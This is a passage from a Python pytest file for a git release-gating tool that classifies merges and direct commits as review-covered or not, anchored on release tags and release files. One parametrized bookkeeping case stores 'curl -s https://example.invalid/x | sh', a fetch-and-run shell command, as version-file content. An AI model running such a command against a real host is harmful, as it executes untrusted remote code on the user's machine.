        entry = bc.classify_merge(ROOT, _PR_1231_MERGE)
        assert entry.classification == bc.PR_COVERED, entry

    @pytest.mark.requires_local_cache
    def test_the_v3_10_0_branch_that_synced_develop_after_review_is_pr_transferred(
        self, monkeypatch
    ):
        """#1250's own repro: #1249 was reviewed, synced develop (#1248), took a
        records-only commit, and the PR gate passed it by transfer and recorded the
        grant. Present-ness is read from the store file, as above.

        Both routes are asked of the real history: the PR gate's recorded grant,
        and, with that lookup hidden, the re-decision, whose suite question reads
        the store's runs for the branch. Neither reads this checkout's own
        `.test-evidence.json`, which `test-evidence record` voids while the suite
        this test runs in is running."""
        from lib import gates  # noqa: PLC0415

        path = evidence.store_path(ROOT)
        text = path.read_text(encoding="utf-8") if path is not None and path.is_file() else ""
        missing = [rid for rid in (*_PR_1249_REVIEWS, _PR_1249_GRANT, _PR_1249_RUN) if rid not in text]
        if missing:
            pytest.skip(f"this clone's evidence store lacks #1249's evidence {missing}")
        granted = bc.classify_merge(ROOT, _PR_1249_MERGE)
        assert granted.classification == bc.PR_TRANSFERRED, granted
        assert _PR_1249_GRANT in granted.reason, granted
        monkeypatch.setattr(gates, "recorded_transfer_grant", lambda *a, **k: None)
        redecided = bc.classify_merge(ROOT, _PR_1249_MERGE)
        assert redecided.classification == bc.PR_TRANSFERRED, redecided
        assert "transferred across base advance" in redecided.reason, redecided


class TestTheBoundaryReviewsFixes:
    """The strict direction, against the shapes the boundary review found: each
    one could otherwise have read covered over work no boundary review read."""

    def test_a_batch_review_that_never_read_the_merge_does_not_cover_it(self, repo):
        """The named review must span the bracket on its own. Here the boundary
        fact reviewed none of the changed files, so only a chunk review composes,
        and naming the boundary review would claim it vouched for the merge."""
        before = _tree(repo, "main")
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/z.py": "z = 1\n"}, "base moves")
        merge = _merge(repo, "f")
        after = _tree(repo, merge)
        hollow = {"base_tree": before, "head_tree": after, "files_changed": evidence.tree_diff(repo, before, after),
                  "files_reviewed": [], "findings": [], "mode": CUMULATIVE}
        assert evidence.append_fact(repo, "review", "rev-bc-hollow", hollow)["status"] == "appended"
        _review(repo, before, after, CHUNK)
        entry = _classify(repo, merge)
        assert entry.classification == bc.UNCOVERED and "rev-bc-hollow" not in entry.reason, entry

    def test_a_merge_commits_own_edit_blocks_pr_covered(self, repo):
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        _git(repo, "checkout", "-q", "main")
        _git(repo, "merge", "-q", "--no-ff", "--no-commit", "f")
        _write(repo, "src/a.py", "a = 999  # changed in the merge\n")
        _git(repo, "add", "-A")
        _git(repo, "commit", "-q", "-m", "merge f, edited")
        entry = _classify(repo, _git(repo, "rev-parse", "HEAD"))
        assert entry.classification == bc.UNCOVERED and "merge commit itself" in entry.reason, entry

    def test_a_clean_merge_has_no_merge_only_content(self, repo):
        """Control for the test above: the same merge, not edited, stays covered."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        assert _classify(repo, _merge(repo, "f")).classification == bc.PR_COVERED

    def test_a_cumulative_over_a_dirty_tree_still_splits_the_span(self, repo):
        """The review's head is a tree no commit has (the working tree it captured);
        the fix verification from it to the tip completes the span."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _write(repo, "src/a.py", "a = 2\n")
        _git(repo, "add", "-A")
        dirty = _git(repo, "write-tree")
        _git(repo, "reset", "-q", "--hard", "HEAD")
        _review(repo, base, dirty, CUMULATIVE)
        _commit(repo, {"src/a.py": "a = 3\n"}, "fix")
        _review(repo, dirty, _tree(repo), VERIFY)
        assert _classify(repo, _merge(repo, "f")).classification == bc.PR_COVERED

    def test_a_short_commit_name_reads_as_the_full_one(self, repo):
        before = _tree(repo, "main")
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _git(repo, "checkout", "-q", "main")
        _commit(repo, {"src/z.py": "z = 1\n"}, "base moves")
        merge = _merge(repo, "f")
        _review(repo, before, _tree(repo, merge), CUMULATIVE)
        entry = _classify(repo, merge[:9])
        assert (entry.classification, entry.commit) == (bc.BATCH_COVERED, merge), entry

    def test_an_octopus_merge_is_unknown(self, repo):
        for name in ("o1", "o2"):
            _branch(repo, name)
            _commit(repo, {f"src/{name}.py": "x = 1\n"}, name)
        _git(repo, "checkout", "-q", "main")
        _git(repo, "merge", "-q", "--no-ff", "-m", "octopus", "o1", "o2")
        entry = _classify(repo, _git(repo, "rev-parse", "HEAD"))
        assert entry.classification == bc.UNKNOWN and "octopus" in entry.reason, entry

    def test_a_fragment_git_would_pair_as_a_rename_is_still_found(self, repo):
        text = _fragment("f")[".prawduct/changes/f.md"]
        _commit(repo, {"notes/draft.md": text}, "a draft on main")
        _branch(repo, "f")
        (repo / ".prawduct" / "changes").mkdir(parents=True)
        _git(repo, "mv", "notes/draft.md", ".prawduct/changes/f.md")
        _commit(repo, {"src/a.py": "a = 1\n"}, "work")
        merge = _merge(repo, "f")
        (entry,) = bc.classify_pending(repo).entries
        assert entry.commit == merge and entry.classification == bc.UNCOVERED, entry

    def test_a_malformed_boundary_fact_is_skipped_not_fatal(self, repo):
        """The store keeps every line it was given: a boundary fact whose trees are
        not strings must not crash every later release check."""
        base = _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        bad = {"base_tree": [base], "head_tree": {"x": 1}, "files_changed": [], "files_reviewed": [],
               "findings": [], "mode": CUMULATIVE}
        assert evidence.append_fact(repo, "review", "rev-bc-bad", bad)["status"] == "appended"
        _review(repo, base, _tree(repo), CUMULATIVE)
        _merge(repo, "f")
        assert bc.classify_pending(repo).entries[0].classification == bc.PR_COVERED

    def test_the_report_marks_each_scope_not_covered(self, repo):
        _branch(repo, "f")
        _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
        _merge(repo, "f")
        _branch(repo, "d")
        _commit(repo, {"README.md": "x\n", **_fragment("d")}, "docs")
        _merge(repo, "d")
        lines = {line.split()[1]: line for line in bc.render(bc.classify_pending(repo)).splitlines()[:-1]}
        assert lines["f"].endswith("[not covered]") and not lines["d"].endswith("[not covered]"), lines


def test_the_pr_skill_names_only_ops_the_hook_dispatches():
    """The release guard tells the agent to run an op; a renamed op would leave
    the skill naming nothing while every other test stays green."""
    import re as _re

    hook = HOOK.read_text(encoding="utf-8")
    dispatched = set(_re.findall(r'command == "([a-z][a-z0-9-]*)"', hook))
    skill = (ROOT / "plugin" / "skills" / "pr" / "SKILL.md").read_text(encoding="utf-8")
    named = set(_re.findall(r"`prawduct-hook ([a-z][a-z0-9-]*)", skill))
    assert "check-boundary-coverage" in named, "the release guard must name the op"
    assert named <= dispatched, sorted(named - dispatched)


def test_the_pr_skill_relays_every_not_covered_entry_not_only_scoped_ones():
    """A walked commit has no scope, so "each scope line it marks" would let the
    agent drop exactly the work no fragment names (wave 1's invisible case)."""
    skill = (ROOT / "plugin" / "skills" / "pr" / "SKILL.md").read_text(encoding="utf-8")
    guard = next(line for line in skill.splitlines() if "run `prawduct-hook check-boundary-coverage --gate`" in line)
    assert "each entry it marks `[not covered]`" in guard, guard
    assert "scope line" not in guard, guard


def test_a_fault_in_the_classification_is_an_attributed_exit_3(repo, tmp_path):
    """The op as used: a store line that breaks the classifier gives exit 3 and a
    named reason, never a traceback (exit 1). The fault is injected in a child
    process through a sitecustomize that breaks one helper the classifier calls."""
    _branch(repo, "f")
    _commit(repo, {"src/a.py": "a = 1\n", **_fragment("f")}, "work")
    _merge(repo, "f")
    inject = tmp_path / "inject"
    inject.mkdir()
    (inject / "sitecustomize.py").write_text(
        "import sys\n"
        f"sys.path.insert(0, {str(ROOT / 'plugin')!r})\n"
        "from lib import boundary_coverage as bc\n"
        "def boom(*_a, **_k):\n    raise RuntimeError('injected')\n"
        "bc._Classifier.classify = boom\n",
        encoding="utf-8",
    )
    env = scrubbed_env(tmp_path / "home", CLAUDE_PROJECT_DIR=str(repo), PYTHONPATH=str(inject))
    proc = subprocess.run([sys.executable, str(HOOK), "check-boundary-coverage"], cwd=str(repo),
                          capture_output=True, text=True, timeout=60, env=env)
    assert proc.returncode == 3, (proc.stdout, proc.stderr)
    assert "RuntimeError: injected" in proc.stderr and "Traceback" not in proc.stderr


# ---------------------------------------------------------------------------
# #1232 requirement 1: the release anchor, and the walk since it (Chunk 02)
# ---------------------------------------------------------------------------

_DECLARING_STATE = (
    "release_version_files:\n"
    "  - path: plugin/VERSION\n"
    "    format: bare\n"
    "  - path: pyproject.toml\n"
    "    format: toml\n"
    "    key: project.version\n"
)


def _cut(repo: Path, version: str, ship: tuple = ()) -> str:
    """A release cut on main: the shipped fragments removed, the release file
    added, the version bumped. ``.gitkeep`` keeps the fragment directory."""
    _git(repo, "checkout", "-q", "main")
    _write(repo, ".prawduct/changes/.gitkeep", "")
    for scope in ship:
        _git(repo, "rm", "-q", f".prawduct/changes/{scope}.md")
    return _commit(repo, {f".prawduct/releases/{version}.md": f"# {version}\n",
                          "plugin/VERSION": version.lstrip("v") + "\n"}, f"release: prep {version}")


def _merged(repo: Path, scope: str, files: "dict | None" = None, *, fragment: bool = True) -> str:
    _branch(repo, scope)
    _commit(repo, {**(files or {f"src/{scope}.py": f"{scope} = 1\n"}),
                   **(_fragment(scope) if fragment else {})}, scope)
    return _merge(repo, scope)


def _by_commit(report: "bc.Report") -> dict:
    return {e.commit: e for e in report.entries}


class TestTheReleaseAnchor:
    def test_a_whole_develop_cut_anchors_on_the_newest_release_file(self, repo):
        """Two cuts: the anchor is the newer one, and nothing merged before it is
        walked (its fragments were shipped, so nothing names it either)."""
        _merged(repo, "first")
        _cut(repo, "v1.0.0", ship=("first",))
        _merged(repo, "second")
        cut = _cut(repo, "v1.1.0", ship=("second",))
        after = _merged(repo, "third")
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor
        assert ".prawduct/releases/v1.1.0.md" in anchor.reason
        assert anchor.tree == _tree(repo, cut)
        report = bc.classify_pending(repo)
        assert [(e.commit, e.scope, e.source) for e in report.entries] == [(after, "third", bc.SOURCE_BOTH)]

    def test_a_file_under_releases_that_is_not_a_release_file_is_no_anchor(self, repo):
        """Only `<version>.md` directly under the directory is a release file: a
        README there would anchor the walk on nothing and hide what follows it."""
        _commit(repo, {".prawduct/releases/README.md": "about\n", ".prawduct/changes/.gitkeep": ""}, "docs")
        assert bc.release_anchor(repo, "main") is None

    def test_a_pruned_cut_keeps_a_withheld_scope_merged_before_it_classified(self, repo):
        withheld = _merged(repo, "withheld")
        _merged(repo, "shipped")
        cut = _cut(repo, "v1.0.0", ship=("shipped",))
        report = bc.classify_pending(repo)
        assert report.anchor.commit == cut
        entry = _by_commit(report)[withheld]
        assert (entry.scope, entry.classification, entry.source) == ("withheld", bc.UNCOVERED,
                                                                     bc.SOURCE_FRAGMENT), entry

    def test_a_back_merged_tag_anchors_on_the_base_commit_it_released(self, repo):
        """Gitflow: the tag sits on a release line merged back into the base. The
        anchor is the base's own commit the release line forked from, never the
        back-merge: a direct commit made on the base before the back-merge was
        not in the release, so it is walked. (This read the back-merge as the
        anchor, and hid that commit, until the Chunk 02 review.)"""
        forked = _git(repo, "rev-parse", "main")
        _git(repo, "checkout", "-q", "-b", "release", "main")
        _commit(repo, {"plugin/VERSION": "1.0.0\n"}, "release 1.0.0")
        _git(repo, "tag", "-a", "v1.0.0", "-m", "v1.0.0")
        _git(repo, "checkout", "-q", "main")
        before = _commit(repo, {"src/before.py": "b = 1\n", ".prawduct/changes/.gitkeep": ""},
                         "before the back-merge")
        back = _merge(repo, "release")
        after = _commit(repo, {"src/after.py": "a = 1\n"}, "after the release")
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (forked, bc.ANCHOR_TAG), anchor
        assert "v1.0.0" in anchor.reason and "side parent" in anchor.reason, anchor
        assert [e.commit for e in bc.classify_pending(repo).entries] == [before, back, after]

    def test_a_hotfix_tag_merged_back_still_walks_the_unreleased_work_before_it(self, repo):
        """A hotfix forked from the released commit, tagged, and merged back into
        the base after more work landed there. Its merge-base with the base is the
        tag itself, and the oldest first-parent commit containing that is the
        back-merge; the hotfix released none of the work merged before it, so the
        anchor is the released commit the hotfix forked from."""
        released = _commit(repo, {"plugin/VERSION": "1.0.0\n", ".prawduct/changes/.gitkeep": ""}, "1.0.0")
        _git(repo, "tag", "v1.0.0")
        unreleased = _merged(repo, "unreleased", fragment=False)
        _git(repo, "checkout", "-q", "-b", "hotfix", released)
        _commit(repo, {"src/app.py": "x = 1\n"}, "hotfix")
        _git(repo, "tag", "v1.0.1")
        back = _merge(repo, "hotfix")
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (released, bc.ANCHOR_TAG), anchor
        walked = [e.commit for e in bc.classify_pending(repo).entries]
        assert unreleased in walked and back in walked, walked

    def test_a_main_back_merge_carrying_a_release_file_is_no_anchor_at_that_merge(self, repo):
        """`main` cut a hotfix release (its release file and tag) and was merged
        back into develop. The back-merge adds the release file against its first
        parent, but brought it in through its side parent: the anchor is develop's
        own release cut, which the promotion and the hotfix both descend from, so
        the work develop merged after that cut is walked."""
        _git(repo, "checkout", "-q", "-b", "develop", "main")
        _commit(repo, {".prawduct/project-state.yaml": "base_branch: develop\n"}, "state")
        cut = _commit(repo, {".prawduct/changes/.gitkeep": "", ".prawduct/releases/v1.0.0.md": "# v1.0.0\n",
                             "plugin/VERSION": "1.0.0\n"}, "release: prep v1.0.0")
        _git(repo, "checkout", "-q", "main")
        _git(repo, "merge", "-q", "--no-ff", "-m", "promote v1.0.0", "develop")
        _commit(repo, {"src/app.py": "x = 1\n", ".prawduct/releases/v1.0.1.md": "# v1.0.1\n"},
                "hotfix: release v1.0.1 on main")
        _git(repo, "tag", "v1.0.1")
        _git(repo, "checkout", "-q", "-b", "feature", "develop")
        _commit(repo, {"src/feature.py": "f = 1\n"}, "feature")
        _git(repo, "checkout", "-q", "develop")
        _git(repo, "merge", "-q", "--no-ff", "-m", "merge feature", "feature")
        unreleased = _git(repo, "rev-parse", "HEAD")
        _git(repo, "merge", "-q", "--no-ff", "-m", "merge main back", "main")
        back = _git(repo, "rev-parse", "HEAD")
        anchor = bc.release_anchor(repo, "develop")
        assert (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor
        assert "v1.0.0.md" in anchor.reason, anchor
        walked = [e.commit for e in bc.classify_pending(repo).entries]
        assert unreleased in walked and back in walked, walked

    def test_a_release_file_cut_on_a_merged_branch_anchors_where_that_branch_forked(self, repo):
        """A cut made on a branch and merged in: the release shipped the branch,
        not the work the base merged meanwhile, so the anchor is the fork point
        and that work is walked."""
        forked = _git(repo, "rev-parse", "main")
        _git(repo, "checkout", "-q", "-b", "prep", "main")
        _commit(repo, {".prawduct/changes/.gitkeep": "", ".prawduct/releases/v1.0.0.md": "# v1.0.0\n"},
                "release: prep v1.0.0")
        _git(repo, "checkout", "-q", "main")
        meanwhile = _commit(repo, {"src/meanwhile.py": "m = 1\n"}, "merged while the cut was on its branch")
        _merge(repo, "prep")
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (forked, bc.ANCHOR_RELEASE_FILE), anchor
        assert meanwhile in [e.commit for e in bc.classify_pending(repo).entries]

    def test_a_merge_promoted_release_anchors_on_the_develop_commit_it_released(self, repo):
        """The consumer repo's shape: develop is merged into `main` and the tag sits
        on that merge, which the base never contains. The merge-base of the base and
        the tag is the develop commit released; work after it is walked."""
        _git(repo, "checkout", "-q", "-b", "develop", "main")
        _commit(repo, {"src/a.py": "a = 1\n", ".prawduct/changes/.gitkeep": ""}, "feature on develop")
        released = _commit(repo, {"src/b.py": "b = 1\n"}, "last commit before the release")
        _git(repo, "checkout", "-q", "main")
        _git(repo, "merge", "-q", "--no-ff", "-m", "release 2.22.0", "develop")
        _git(repo, "tag", "-a", "v2.22.0", "-m", "v2.22.0")
        _git(repo, "checkout", "-q", "develop")
        after = _commit(repo, {"src/c.py": "c = 1\n"}, "after the release")
        anchor = bc.release_anchor(repo, "develop")
        assert (anchor.commit, anchor.source) == (released, bc.ANCHOR_TAG), anchor
        assert "merge-base with tag v2.22.0" in anchor.reason, anchor
        # The tag is out of the base's reach: a reachable-only reading finds nothing.
        assert _git(repo, "tag", "--merged", "develop") == ""
        _write(repo, ".prawduct/project-state.yaml", "base_branch: develop\n")
        _git(repo, "add", "-A")
        _git(repo, "commit", "-q", "-m", "state")
        assert [e.commit for e in bc.classify_pending(repo).entries] == [after]

    def test_a_hotfix_tag_forked_long_ago_anchors_early_and_a_release_file_wins(self, repo):
        """The newest version tag can sit on a line that forked long ago (a hotfix
        branch). Its merge-base is old, so B anchors early, which only widens the
        walk; a release file nearer the tip wins."""
        _git(repo, "checkout", "-q", "-b", "hotfix", "main")
        _commit(repo, {"src/hot.py": "h = 1\n"}, "hotfix")
        _git(repo, "tag", "v9.0.1")
        _git(repo, "checkout", "-q", "main")
        _merged(repo, "work")
        assert bc.release_anchor(repo, "main").commit == _git(repo, "rev-list", "--max-parents=0", "main")
        cut = _cut(repo, "v1.0.0", ship=("work",))
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor

    def test_a_tag_sharing_no_history_with_the_base_gives_no_anchor(self, repo):
        _git(repo, "checkout", "-q", "--orphan", "elsewhere")
        _git(repo, "rm", "-rqf", ".")
        _commit(repo, {"other.txt": "o\n"}, "unrelated root")
        _git(repo, "tag", "v5.0.0")
        _git(repo, "checkout", "-q", "main")
        assert bc.release_anchor(repo, "main") is None
        # And it must not shadow a release file: the unrelated tag is no candidate.
        cut = _cut(repo, "v1.0.0")
        assert bc.release_anchor(repo, "main").commit == cut

    def test_a_tag_on_the_first_parent_line_is_its_own_anchor(self, repo):
        tagged = _commit(repo, {"plugin/VERSION": "1.0.0\n", ".prawduct/changes/.gitkeep": ""}, "1.0.0")
        _git(repo, "tag", "v1.0.0")
        _commit(repo, {"src/after.py": "a = 1\n"}, "after")
        assert bc.release_anchor(repo, "main").commit == tagged

    def test_the_newest_release_tag_wins_and_prerelease_and_other_tags_are_ignored(self, repo):
        """Version order, not commit order, picks the tag. A prerelease marks no
        release, so ``v2.0.0-rc1``, though it sorts above ``v1.10.0``, is passed
        over: anchoring there would leave every commit between the last real
        release and it unwalked. (It anchored here until the native review's
        prerelease-anchor finding.)"""
        _commit(repo, {".prawduct/changes/.gitkeep": ""}, "x")
        _git(repo, "tag", "v1.10.0")
        _commit(repo, {"src/b.py": "b = 1\n"}, "y")
        _git(repo, "tag", "v1.9.0")  # a newer commit, an older version
        _git(repo, "tag", "backup/not-a-version")
        _git(repo, "tag", "v2.0.0-rc1")  # a prerelease of a newer version
        _commit(repo, {"src/c.py": "c = 1\n"}, "z")
        _git(repo, "tag", "nightly")
        anchor = bc.release_anchor(repo, "main")
        assert "tag v1.10.0" in anchor.reason and "rc1" not in anchor.reason, anchor
        assert anchor.commit == _git(repo, "rev-parse", "main~2"), anchor

    def test_an_rc_tag_after_an_unreviewed_direct_commit_does_not_hide_it(self, repo):
        """The native review's scenario: v1.0.0, then a direct commit with no
        fragment, then ``v1.1.0-rc.1``. The walk must start at v1.0.0, so the
        direct commit is classified and a per_release release gate refuses it."""
        from lib import review_lane  # noqa: PLC0415

        released = _commit(repo, {".prawduct/changes/.gitkeep": ""}, "1.0.0")
        _git(repo, "tag", "v1.0.0")
        direct = _commit(repo, {"src/direct.py": "d = 1\n"}, "direct, no fragment")
        _commit(repo, {"src/rc.py": "r = 1\n"}, "rc work")
        _git(repo, "tag", "v1.1.0-rc.1")
        report = bc.classify_pending(repo)
        assert report.anchor.commit == released, report.anchor
        assert _by_commit(report)[direct].classification == bc.DIRECT, report.entries
        gate = bc.release_gate(report, review_lane.Policy(review_lane.PER_RELEASE, "main"))
        assert gate.exit == 1 and direct in [e.commit for e in gate.owed], gate

    def test_a_foreign_newest_tag_is_passed_over_for_an_older_related_one(self, repo):
        """A tag sharing no history with the base (a fork's, or vendored) says
        nothing about what the base released: the newest RELATED tag anchors,
        rather than the foreign one leaving no anchor at all."""
        released = _commit(repo, {".prawduct/changes/.gitkeep": ""}, "1.0.0")
        _git(repo, "tag", "v1.0.0")
        _commit(repo, {"src/after.py": "a = 1\n"}, "after")
        _git(repo, "checkout", "-q", "--orphan", "fork")
        _git(repo, "rm", "-rqf", ".")
        _commit(repo, {"other.txt": "o\n"}, "a fork's root")
        _git(repo, "tag", "v9.0.0")
        _git(repo, "checkout", "-q", "main")
        anchor = bc.release_anchor(repo, "main")
        assert anchor is not None and anchor.commit == released, anchor
        assert "tag v1.0.0" in anchor.reason and "v9.0.0" not in anchor.reason, anchor

    def test_a_tag_nearer_the_tip_than_the_release_file_wins(self, repo):
        _merged(repo, "early")
        _cut(repo, "v1.0.0", ship=("early",))
        _commit(repo, {"src/between.py": "b = 1\n"}, "between")
        tagged = _commit(repo, {"src/t.py": "t = 1\n"}, "tagged")
        _git(repo, "tag", "v1.0.1")
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (tagged, bc.ANCHOR_TAG), anchor
        assert "nearer the tip than the release file" in anchor.reason

    def test_a_release_file_nearer_the_tip_than_the_tag_wins(self, repo):
        _commit(repo, {".prawduct/changes/.gitkeep": ""}, "x")
        _git(repo, "tag", "v0.9.0")
        _merged(repo, "early")
        cut = _cut(repo, "v1.0.0", ship=("early",))
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor
        assert "tag v0.9.0 anchors older" in anchor.reason

    def test_a_tied_anchor_goes_to_the_release_file(self, repo):
        cut = _cut(repo, "v1.0.0")
        _git(repo, "tag", "v1.0.0")
        anchor = bc.release_anchor(repo, "main")
        assert (anchor.commit, anchor.source) == (cut, bc.ANCHOR_RELEASE_FILE), anchor

    def test_with_neither_there_is_no_anchor_and_the_report_says_so(self, repo, tmp_path):
        """No anchor: the walk is skipped, so a direct commit no fragment names is
        not seen, and the report says why rather than reading as a full answer."""
        _merged(repo, "f")
        _commit(repo, {"src/direct.py": "d = 1\n"}, "direct, no fragment")
        report = bc.classify_pending(repo)
        assert report.anchor is None and "no version tag" in report.no_anchor_reason, report
        assert [(e.scope, e.source) for e in report.entries] == [("f", bc.SOURCE_FRAGMENT)]
        assert "no release anchor" in bc.count_line(report)
        assert "release anchor: none — " in bc.render(report)
        data = json.loads(_run_cli(repo, tmp_path, "--json").stdout)
        assert data["anchor"] is None and data["no_anchor_reason"] == report.no_anchor_reason


class TestTheWalkSinceTheAnchor:
    def test_a_judgeable_direct_commit_with_no_fragment_is_classified(self, repo, tmp_path):
        """Wave 1's invisible case: work committed on the base that wrote no
        fragment. A records-only commit is not judgeable, so is not walked."""
        _cut(repo, "v1.0.0")
        direct = _commit(repo, {"src/direct.py": "d = 1\n"}, "direct, no fragment")
        _commit(repo, {".prawduct/owner-rulings.md": "ruled\n"}, "records only")
        report = bc.classify_pending(repo)
        (entry,) = report.entries
        assert (entry.commit, entry.classification, entry.source, entry.scope, entry.subject) == (
            direct, bc.DIRECT, bc.SOURCE_WALK, "", "direct, no fragment"), entry
        line = bc.count_line(report)
        assert "0 of 1 covered" in line and "1 judgeable commit(s) since release anchor" in line, line
        assert "(no fragment) 'direct, no fragment'" in bc.render(report)
        data = json.loads(_run_cli(repo, tmp_path, "--json").stdout)
        assert data["anchor"]["commit"] == report.anchor.commit
        assert data["anchor"]["source"] == bc.ANCHOR_RELEASE_FILE
        assert [(e["commit"], e["source"]) for e in data["entries"]] == [(direct, bc.SOURCE_WALK)]

    def test_a_merge_found_by_both_is_one_entry(self, repo):
        _cut(repo, "v1.0.0")
        base = _branch(repo, "f")
        _commit(repo, {"src/f.py": "f = 1\n", **_fragment("f")}, "work")
        _review(repo, base, _tree(repo), CUMULATIVE)
        merge = _merge(repo, "f")
        (entry,) = bc.classify_pending(repo).entries
        assert (entry.commit, entry.scope, entry.source, entry.classification) == (
            merge, "f", bc.SOURCE_BOTH, bc.PR_COVERED), entry

    def test_two_fragments_one_merge_added_are_one_entry_naming_both(self, repo):
        _branch(repo, "pair")
        _commit(repo, {"src/p.py": "p = 1\n", **_fragment("a"), **_fragment("b")}, "two scopes")
        merge = _merge(repo, "pair")
        (entry,) = bc.classify_pending(repo).entries
        assert (entry.commit, entry.scope) == (merge, "a, b"), entry

    def test_a_merge_whose_only_judgeable_change_is_its_own_edit_is_uncovered(self, repo):
        """The walk reaches a merge by its diff against the first parent. A branch
        that changed nothing judgeable, merged with an edit made in the merge,
        carries code no review of the branch read."""
        _cut(repo, "v1.0.0")
        _branch(repo, "docs")
        _commit(repo, {"README.md": "docs\n"}, "docs")
        _git(repo, "checkout", "-q", "main")
        _git(repo, "merge", "-q", "--no-ff", "--no-commit", "docs")
        _write(repo, "src/sneak.py", "s = 1\n")
        _git(repo, "add", "-A")
        _git(repo, "commit", "-q", "-m", "merge docs, with an edit")
        (entry,) = bc.classify_pending(repo).entries
        assert entry.classification == bc.UNCOVERED and "merge commit itself" in entry.reason, entry

    def test_a_clean_docs_merge_is_not_walked(self, repo):
        """Control for the test above: the same merge without the edit changes no
        judgeable file against its first parent, so the walk passes it by."""
        _cut(repo, "v1.0.0")
        _merged(repo, "docs", {"README.md": "docs\n"}, fragment=False)
        report = bc.classify_pending(repo)
        assert report.anchor is not None and report.entries == [], report

    def test_moving_code_to_a_non_judgeable_path_is_walked(self, repo):
        """Rename detection would list only the new `.md` path, which is not
        judgeable; the deleted code is, so the walk lists both sides."""
        _cut(repo, "v1.0.0")
        (repo / "notes").mkdir()
        _git(repo, "mv", "src/app.py", "notes/app.md")
        moved = _commit(repo, {}, "move code into notes")
        assert [e.commit for e in bc.classify_pending(repo).entries] == [moved]

    def test_check_releasability_notes_a_walked_commit_by_its_name(self, repo):
        """The NOTE for a walked commit names it: it has no scope to name."""
        from lib import release_readiness  # noqa: PLC0415

        _cut(repo, "v1.0.0")
        direct = _commit(repo, {"src/direct.py": "d = 1\n"}, "direct, no fragment")
        notes = [line for line, to_stderr in release_readiness._boundary_coverage_lines(repo) if to_stderr]
        assert notes == [
            f'NOTE: boundary-coverage: {direct[:8]} "direct, no fragment" is direct, not covered — '
            "a single-parent commit changing 1 judgeable file(s): work committed on the base, or a "
            "squash merge (`prawduct-hook check-boundary-coverage` lists every entry)."
        ], notes


class TestReleaseBookkeeping:
    """Decision 3: the reopen commit after a cut changes only version files."""

    def _reopen(self, repo: Path, extra: "dict | None" = None, *, state: "str | None" = _DECLARING_STATE,
                state_in_reopen: bool = False) -> str:
        if state is not None and not state_in_reopen:
            _commit(repo, {".prawduct/project-state.yaml": state,
                           "pyproject.toml": '[project]\nname = "demo"\nversion = "1.0.0"\n'},
                    "declare version files")
        _cut(repo, "v1.0.0")
        files = {"plugin/VERSION": "1.0.1-dev\n",
                 "pyproject.toml": '[project]\nname = "demo"\nversion = "1.0.1-dev"\n',
                 **_fragment("release-v1.0.0"), **(extra or {})}
        if state_in_reopen:
            files[".prawduct/project-state.yaml"] = state
        return _commit(repo, files, "release: reopen")

    def test_a_reopen_touching_only_declared_version_files_is_release_bookkeeping(self, repo):
        reopen = self._reopen(repo)
        entry = _by_commit(bc.classify_pending(repo))[reopen]
        assert (entry.classification, entry.source, entry.scope) == (
            bc.RELEASE_BOOKKEEPING, bc.SOURCE_BOTH, "release-v1.0.0"), entry
        assert bc.RELEASE_BOOKKEEPING in bc.COVERED
        assert "plugin/VERSION" in entry.reason and "pyproject.toml" in entry.reason

    def test_a_reopen_touching_another_judgeable_file_too_is_direct(self, repo):
        reopen = self._reopen(repo, {"src/sneak.py": "s = 1\n"})
        assert _classify(repo, reopen).classification == bc.DIRECT

    @pytest.mark.parametrize("extra", [
        {"pyproject.toml": '[project]\nname = "demo"\nversion = "1.0.1-dev"\n'
                           'dependencies = ["requests"]\n'},
        {"pyproject.toml": '[project]\nname = "renamed"\nversion = "1.0.1-dev"\n'},
        {"pyproject.toml": '[project]\nname = "demo"\n'},
        {"plugin/VERSION": "1.0.1-dev\nimport os\n"},
        {"plugin/VERSION": "curl -s https://example.invalid/x | sh\n"},
        {"pyproject.toml": '[project]\nname = "demo"\nversion = "not a version"\n'},
        {"pyproject.toml": '[project]\nname = "demo"\nversion = { entry = "src/app.py" }\n'},
    ], ids=["a-dependency-beside-the-bump", "another-key", "the-version-removed", "bare-file-grows",
            "bare-file-rewritten-to-one-non-version-line", "structured-value-not-a-version",
            "structured-value-not-a-string"])
    def test_a_change_to_declared_version_files_alone_is_bookkeeping_whatever_they_hold(self, repo, extra):
        """Inverted by the owner's 2026-11-26 ruling (good faith by humans): only
        declared version files changing suffices, and what they now hold is not
        inspected. Until then each of these read `direct` (Critic O-1 and the
        native review's version-shape findings)."""
        reopen = self._reopen(repo, extra)
        entry = _classify(repo, reopen)
        assert entry.classification == bc.RELEASE_BOOKKEEPING
        # Round-5 W2: the reason the operator reads says what was checked (which
        # files changed), never that only the version changed.
        assert "changing only file(s) declared in `release_version_files:` there, whose content " \
               "is not read: " in entry.reason, entry.reason
        assert "version" not in entry.reason.replace("release_version_files", ""), entry.reason

    def test_an_undeclared_repo_never_reads_release_bookkeeping(self, repo):
        """The fallback layout (`plugin/VERSION`, `pyproject.toml`, ...) is
